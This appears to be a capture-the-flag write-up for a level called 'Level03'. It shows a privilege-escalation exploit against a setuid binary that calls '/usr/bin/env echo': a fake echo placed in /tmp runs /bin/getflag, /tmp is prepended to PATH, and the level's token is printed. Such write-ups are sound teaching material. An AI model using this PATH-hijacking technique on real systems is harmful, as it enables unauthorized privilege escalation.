# Level03

## Solution

We have an executable in the home directory.

```
$ ls -l
total 12
-rwsr-sr-x 1 flag03 level03 8627 Mar  5  2016 level03
$ ./level03
Exploit me
```

We can see with strings that it uses /usr/bin/env echo to write Exploit me.

```
$ strings level03 | grep "Exploit me"
/usr/bin/env echo Exploit me
```

We can use this by replacing it with our echo to execute /bin/getflag.

```
$ vim /tmp/echo
```

```
/bin/getflag
```

We created our fake echo. We add permissions to our echo.

```
$ chmod +x /tmp/echo
```

Now we add /tmp to the list of possible directories to search for echo at the beginning so that it finds our echo first.

```
$ export PATH=/tmp:$PATH
```

Now let's try to restart the executable.

```
$ ./level03
Check flag.Here is your token : qi0maab88jeaj46qoumi7maus
```